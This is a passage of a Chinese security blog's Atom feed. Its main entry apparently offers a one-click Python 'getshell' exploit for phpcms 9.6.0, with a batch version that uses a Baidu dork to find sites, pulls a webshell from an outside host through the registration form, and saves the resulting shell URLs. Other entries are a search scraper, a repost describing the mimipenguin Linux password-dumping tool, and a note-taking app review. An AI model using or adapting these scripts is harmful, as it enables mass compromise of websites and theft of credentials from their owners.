class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</div><div class="line">&#125;</div><div class="line"></div><div class="line">def parseBaidu(keyword, pagenum)</div><div class="line"></div><div class="line">def main():</div><div class="line">    for url in parseBaidu("keyword",10):</div><div class="line">        if url:</div><div class="line">            print(url)</div><div class="line">        else:</div><div class="line">            continue</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;parseBaidu&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(keyword, pagenum)&lt;/span&gt;:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    keywordsBaseURL = &lt;span class=&quot;string&quot;&gt;&#39;https://www.baidu.com/s?wd=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;oq=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;ie=utf-8&#39;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;pn=&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    pnum = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; pnum &amp;lt;= int(pagenum):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        baseURL = keywordsBaseURL + str(pnum*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            request = requests.get(baseURL, headers=headers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            soup = BeautifulSoup(request.text, &lt;span class=&quot;string&quot;&gt;&quot;html.parser&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; a &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; soup.select(&lt;span class=&quot;string&quot;&gt;&#39;div.c-container &amp;gt; h3 &amp;gt; a&#39;&lt;/span&gt;):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                url = requests.get(a[&lt;span class=&quot;string&quot;&gt;&#39;href&#39;&lt;/span&gt;], headers=headers).url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;None&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            pnum += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>phpcms9-6-0 一键getshell工具</title>
    <link href="http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
    <id>http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html</id>
    <published>2017-04-10T05:13:29.000Z</published>
    <updated>2017-04-11T05:12:31.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
</ul>
<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
<li>[] 加入对有验证码phpcms网站的支持</li>
<li>[] 加入批量(<strong>已完成</strong>)</li>
</ul>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一键化&lt;code&gt;python 1.py http://xxx.com&lt;/code&gt;,如果是批量直接运行py文件即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;待办&quot;&gt;&lt;a href=&quot;#待办&quot; class=&quot;headerlink&quot; title=&quot;待办&quot;&gt;&lt;/a&gt;待办&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;[] 加入对有验证码phpcms网站的支持&lt;/li&gt;
&lt;li&gt;[] 加入批量(&lt;strong&gt;已完成&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>抓取当前登录用户登录密码的工具：mimipenguin</title>
    <link href="http://akkuman.coding.me/2017/04/02/mimipenguin.html"/>
    <id>http://akkuman.coding.me/2017/04/02/mimipenguin.html</id>
    <published>2017-04-02T02:03:29.000Z</published>
    <updated>2017-04-06T03:25:08.672Z</updated>
    
    <content type="html"><![CDATA[<p><strong><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="external">Github项目地址</a></strong></p>
<p>前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。<br>编写思路来自流行的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">windows密码抓取神器mimikatz</a><br><a id="more"></a><br><img src="https://ooo.0o0.ooo/2017/04/06/58e5a6e8ac47f.png" alt=""></p>
<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
<li>root权限</li>
</ul>
<h2 id="已支持-以下环境已通过测试"><a href="#已支持-以下环境已通过测试" class="headerlink" title="已支持(以下环境已通过测试)"></a>已支持(以下环境已通过测试)</h2><ul>
<li>Kali 4.3.0 (rolling) x64 (gdm3)</li>
<li>Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>VSFTPd 3.0.3-8+b1 (Active FTP client connections)</li>
<li>Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]</li>
<li>openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)</li>
</ul>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><ul>
<li>在内存中的密码 - 100%有效</li>
<li>计划扩大支持和其他凭证位置</li>
<li>努力扩展到非桌面环境</li>
<li>已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题</li>
<li>开放提出请求和社区研究</li>
<li>计划未来的LDAP研究（nscld winbind等）</li>
</ul>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li>Twitter: <a href="https://twitter.com/HunterGregal" target="_blank" rel="external">@huntergregal</a></li>
<li>个人站点: <a href="http://huntergregal.com/" target="_blank" rel="external">huntergregal.com</a></li>
<li>Github: <a href="https://github.com/huntergregal" target="_blank" rel="external">huntergregal</a></li>
</ul>
<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><ul>
<li>the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option</li>
<li>gentilkiki for Mimikatz, the inspiration and the twitter shoutout</li>
<li>pugilist for cleaning up PID extraction and testing</li>
<li>ianmiell for cleaning up some of my messy code</li>
<li>w0rm for identifying printf error when special chars are involved</li>
<li>benichmt1 for identifying multiple authenticate users issue</li>
<li>ChaitanyaHaritash for identifying special char edge case issues</li>
</ul>
<p>转载自<a href="https://github.com/huntergregal/mimipenguin/blob/master/README.md" target="_blank" rel="external">mimipenguin</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/huntergregal/mimipenguin&quot;&gt;Github项目地址&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。&lt;br&gt;编写思路来自流行的&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;windows密码抓取神器mimikatz&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>推荐一个静态博客兼笔记的工具：WDTP</title>
    <link href="http://akkuman.coding.me/2017/04/01/Walden-Tips-Introdution.html"/>
    <id>http://akkuman.coding.me/2017/04/01/Walden-Tips-Introdution.html</id>
    <published>2017-04-01T12:27:51.000Z</published>
    <updated>2017-04-01T12:37:12.404Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：<strong>简洁高效、轻灵优雅、先进强悍、操作简单</strong>。</p>
<a id="more"></a>
<p><img src="http://underwaysoft.com/works/wdtp/media/wdtp-main.jpg" alt=""></p>
<p>WDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体：</p>
<ul>
<li>以<strong>文字、声音、图片、视频为主要内容</strong>的写作/记录/创作/分享者</li>
<li>职业或业余作家、小说家、编剧、技术类图书的作者及编撰者</li>
<li>经常记笔记或写点东西的人</li>
<li>写作极客</li>
<li>打算采用静态页面的个人博客</li>
<li>打算采用静态页面的中小企业<br>WDTP的全名是：<strong>Walden Tips</strong>，中文名称：<strong>山湖录</strong>，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。</li>
</ul>
<h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><ul>
<li>创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。</li>
<li>笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。</li>
<li>建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。</li>
<li>Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。</li>
<li>以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。</li>
<li>WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。<br>其他更多……</li>
</ul>
<p>在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。</p>
<p><strong>程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>程序开源<a href="https://github.com/LegendRhine/WDTP" target="_blank" rel="external">github地址</a></strong></p>
<h2 id="上手使用"><a href="#上手使用" class="headerlink" title="上手使用"></a>上手使用</h2><p>本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点</p>
<p><strong>那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？</strong></p>
<h3 id="上传到vps"><a href="#上传到vps" class="headerlink" title="上传到vps"></a>上传到vps</h3><p>这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)<br>如果你的服务器是windows那么你只需要去<a href="https://www.resilio.com/individuals/" target="_blank" rel="external">Resilio Sync官网</a>下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难<br>如果你的服务器是Linux，可以查看Resilio Sync网站上面的<a href="https://help.getsync.com/hc/en-us/articles/206178924" target="_blank" rel="external">How to install Sync Package on Linux</a>，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。<br>trust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync<br>当然，这只是我自己使用的方法，你也可以使用其他方法<br>至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git 